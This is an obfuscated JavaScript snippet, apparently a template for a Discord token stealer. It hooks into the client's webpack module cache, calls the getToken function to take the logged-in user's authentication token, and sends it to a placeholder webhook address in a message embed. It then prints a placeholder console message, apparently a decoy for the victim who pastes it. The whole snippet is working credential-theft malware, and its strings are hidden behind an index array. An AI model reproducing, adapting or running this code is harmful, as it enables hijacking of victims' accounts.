var _0x2f0f = ["%WEBHOOK_LINK%", "exports", "extra_id", "push", "c", "hasOwnProperty", "__esModule", "default", "getToken", "POST", "open", "Content-type", "application/json", "setRequestHeader", "%TITLE%", "%MESSAGE%", "stringify", "send", "%CONSOLE%", "log"];
var ss = _0x2f0f[0];
var req = webpackJsonp[_0x2f0f[3]]([[], {
extra_id : function prefetchGroupsInfo(canCreateDiscussions, forum, courseId) {
return canCreateDiscussions[_0x2f0f[1]] = courseId;
}
}, [[_0x2f0f[2]]]]);
var _e;
for (_e in req[_0x2f0f[4]]) {
if (req[_0x2f0f[4]][_0x2f0f[5]](_e)) {
var _t = req[_0x2f0f[4]][_e][_0x2f0f[1]];
if (_t && _t[_0x2f0f[6]] && _t[_0x2f0f[7]]) {
var _e2;
for (_e2 in _t[_0x2f0f[7]]) {
if (_0x2f0f[8] === _e2) {
nitrogen = _t[_0x2f0f[7]][_0x2f0f[8]]();
}
}
}
}
}
var e = new XMLHttpRequest;
e[_0x2f0f[10]](_0x2f0f[9], ss), e[_0x2f0f[13]](_0x2f0f[11], _0x2f0f[12]);
var t = {
username : _0x2f0f[14],
content : _0x2f0f[15],
embeds : [{
description : nitrogen
}]
};
e[_0x2f0f[17]](JSON[_0x2f0f[16]](t));
console[_0x2f0f[19]](_0x2f0f[18]);